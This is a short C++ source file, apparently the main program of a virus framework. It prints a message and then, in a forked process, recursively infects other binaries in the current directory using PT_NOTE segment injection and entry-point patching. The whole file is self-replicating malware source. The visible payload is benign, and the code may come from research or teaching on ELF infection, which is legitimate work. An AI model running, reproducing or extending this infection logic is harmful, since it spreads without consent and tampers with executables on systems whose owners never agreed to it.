#include <cstddef>
#include "common/macros.hh"
#include "common/recursive_directory_iterator.hh"
#include "infector/pt_note_infector.hh"
#include "propagation/propagate.hh"
#include "redirection/entry_point.hh"

// This virus simply prints a message to stdout and then finds other binaries
// to infect recursively in the current directory (2 levels deep), in a forked
// process.
int main() {
  // The STR_LITERAL macro makes our string literal in text segment, which is
  // injection safe.
  const char* str = STR_LITERAL("Hello World\n");

  vf::write(1, str, vf::strlen(str));

  vf::propagation::forked_propagate<vf::common::RecursiveDirectoryIterator<2>,
                                    vf::infector::PtNoteInfector,
                                    vf::redirection::EntryPointPatcher>();

  return 0;
}